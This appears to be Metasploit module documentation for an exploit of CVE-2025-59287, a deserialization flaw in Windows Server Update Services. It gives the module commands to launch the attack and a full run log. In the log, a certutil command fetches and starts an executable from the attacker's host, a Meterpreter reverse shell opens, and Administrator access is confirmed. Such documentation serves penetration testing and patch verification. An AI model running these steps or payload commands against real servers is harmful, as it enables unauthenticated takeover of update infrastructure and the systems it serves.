## Vulnerable Application

Provides features for managing and distributing updates through a management console.
The [CVE-2025-59287](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-59287) is a remote code execution vulnerability in
this component that allows an unauthenticated attacker to create a specially crafted event that gets unsafely deserialized upon server sync.
One way to run synchronization is to open the `Windows Server Update Service` app,
the other is to run the following command from PowerShell:

`(Get-WsusServer).GetSubscription().GetLastSynchronizationInfo()`

- Windows Server 2012 - fixed in version **6.2.9200.25728**
- Windows Server 2016 - fixed in version **10.0.14393.8524**
- Windows Server 2025 - fixed in version **10.0.26100.6905**

## Verification Steps

1. Setup WSUS on target server
1. Do: `use exploit/windows/http/wsus_deserialization_rce`
1. Do: `set RHOSTS [target IP]`
1. Do: `set LHOST [attacker IP]`
1. Do: `set LPORT [attacker port]`
1. Do: `run`

## Options


## Scenarios

```
msf exploit(windows/http/wsus_deserialization_rce) > run verbose=true
[*] Command to run on remote host: certutil -urlcache -f http://192.168.3.7:8080/g7dX6dKZEs4KZYEuEJH2KQ %TEMP%\nYFKgDXL.exe & start /B %TEMP%\nYFKgDXL.exe
[*] Fetch handler listening on 192.168.3.7:8080
[*] HTTP server started
[*] Adding resource /g7dX6dKZEs4KZYEuEJH2KQ
[*] Started reverse TCP handler on 192.168.3.7:4444 
[*] Getting server ID
[*] Getting authentication cookie
[*] Getting reporting cookie
[*] Trying to create malicious event
[*] Created malicious event, now waiting for WSUS to sync
[*] Client 10.5.132.161 requested /g7dX6dKZEs4KZYEuEJH2KQ
[*] Sending payload to 10.5.132.161 (Microsoft-CryptoAPI/10.0)
[*] Client 10.5.132.161 requested /g7dX6dKZEs4KZYEuEJH2KQ
[*] Sending payload to 10.5.132.161 (CertUtil URL Agent)
[*] Sending stage (230982 bytes) to 10.5.132.161
[*] Meterpreter session 1 opened (192.168.3.7:4444 -> 10.5.132.161:49984) at 2025-11-04 12:27:00 +0100

meterpreter > sysinfo
Computer        : WIN2022__63DA
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: WIN2022__63DA\Administrator
```
